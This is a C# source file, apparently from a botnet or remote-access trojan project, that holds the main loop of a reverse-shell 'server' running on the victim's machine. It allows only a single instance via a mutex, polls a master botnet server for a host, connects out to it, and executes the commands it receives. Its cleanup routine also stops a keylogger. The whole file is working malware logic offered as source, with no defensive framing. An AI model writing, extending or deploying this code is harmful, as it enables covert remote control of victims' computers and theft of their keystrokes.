using System;
using System.Collections.Generic;
using System.Threading;
using ServerBotnet;
using ServerCommands;
using Shared;

namespace ReverseShellServer
{
    public class ServerManager
    {
        internal ServerNetworkManager networkManager { get; set; }

        internal ServerCommandsManager commandsManager { get; set; }

        /// <summary>
        /// Time in ms to wait for between each server contact
        /// </summary>
        readonly int serverRequestRetryDelay = 5000;

        /// <summary>
        /// Time in ms to wait between each client connection attempt
        /// </summary>
        readonly int clientConnectionRetryDelay = 2000;

        /// <summary>
        /// Number of times the server will try to connect to the client
        /// </summary>
        int _connectionRetryCount;

        int connectionRetryCount
        {
            get => _connectionRetryCount;

            // If incrementation, reset value
            set => _connectionRetryCount = value > _connectionRetryCount ? 10 : value;
        }


        /// <summary>
        /// Constructor checks if another instance of the application is already running,
        /// if there is one, close itself and let the already started one live
        /// </summary>
        public ServerManager()
        {
            // Only one instance can run, random string identifier
            var mutex = new Mutex(false, "ThisIsMyMutex-2JUY34DE8E23D7");
            if (!mutex.WaitOne(TimeSpan.Zero, true))
            {
                Environment.Exit(0);
            }
        }


        /// <summary>
        /// Entry point of the server manager, call the master botnet server to acquire instructions.
        /// This process occures every {retryDelay} ms.
        /// If it acquires a remote host to connect to, call the RunServer() method
        /// </summary>
        public void Start()
        {
            while (true)
            {
                var connectionSettings = BotnetManager.Process();
                if (connectionSettings != null)
                {
                    // Reset retry count
                    connectionRetryCount++;

                    while (connectionRetryCount != 0)
                    {
                        try
                        {
                            RunServer(connectionSettings.Item1, connectionSettings.Item2);
                        }
                        catch (Exception ex)
                        {
                            // Exceptions thrown trigger the network manager cleanup
                            Cleanup();

                            // The client asked to stop the connection, break from the connection loop
                            if(ex.GetType() == typeof(ExitException)) break;

                            connectionRetryCount--;
                            Thread.Sleep(clientConnectionRetryDelay);
                        }
                    }
                }

                Thread.Sleep(serverRequestRetryDelay);
            }
        }


        /// <summary>
        /// Call the ServerNetworkManager ConnectToClient method, if the connection is succesfull,
        /// start to listen for incoming commands from the client.
        /// </summary>
        /// <param name="remoteAdress">Remote end to connect to</param>
        /// <param name="remotePort">Remote end's port to connect to</param>
        void RunServer(string remoteAdress, int remotePort)
        {
            if (!networkManager.ConnectToClient(remoteAdress, remotePort))
            {
                // The connection attempt wasn't successfull
                throw new NetworkException();
            }

            // Reset retry count
            connectionRetryCount++;

            // While there is no exception, wait for incoming data and process it
            while (true)
            {
                try
                {
                    var incomingData = networkManager.ReadLine();
                    // A simple dot beeing received is the client's connection monitoring sending a hearthbeat message
                    if(incomingData == ".")
                        continue;
                    ProcessCommand(incomingData);
                }
                catch (StopServerException)
                {
                    StopServer();
                }
            }
        }


        /// <summary>
        /// Process a string that was already processed by the client sending it, so it's a valid command
        /// </summary>
        /// <param name="receivedData">Data sent by the client</param>
        void ProcessCommand(string receivedData)
        {
            var splittedCommand = commandsManager.GetSplittedCommand(receivedData);
            var commandName = splittedCommand[0];
            var arguments = new List<string>();

            if (splittedCommand.Count > 1)
            {
                arguments = splittedCommand.GetRange(1, splittedCommand.Count - 1);
            }

            var command = commandsManager.GetCommandByName(commandName);

            // Exceptions are caught and treated by the calling method
            command?.Process(arguments);
        }


        /// <summary>
        /// Close network stream and stop the key listening as well
        /// </summary>
        void Cleanup()
        {
            try
            {
                MainWindow.keyLoggerManager.Stop();
                networkManager.Cleanup();
            }
            catch (Exception)
            {
                // ignored
            }
        }


        /// <summary>
        /// Exit the program
        /// </summary>
        void StopServer()
        {
            Cleanup();
            Environment.Exit(0);
        }
    }
}
